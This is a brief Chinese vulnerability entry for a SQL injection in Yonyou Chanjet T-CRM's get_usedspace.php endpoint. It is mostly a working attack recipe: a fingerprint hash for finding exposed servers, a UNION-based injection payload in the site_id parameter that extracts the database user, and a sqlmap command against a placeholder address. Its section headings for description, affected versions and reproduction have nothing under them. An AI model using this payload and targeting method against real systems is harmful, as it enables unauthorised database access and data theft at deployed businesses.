# 用友畅捷通CRMget_usedspace存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="223dcd70f982801e9177078a818a9b59"`

**请求体 / payload**
```
/webservice/get_usedspace.php?site_id=-999 UNION ALL SELECT CONCAT(0x7e,0x7e,user(),0x7e,0x7e)--

sqlmap
python3 sqlmap.py -u "http://xx.xx.xx.xx/webservice/get_usedspace.php?site_id=1" --batch
```

**其他**
- 用友畅捷通CRM get\_usedspace存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友畅捷通T-CRM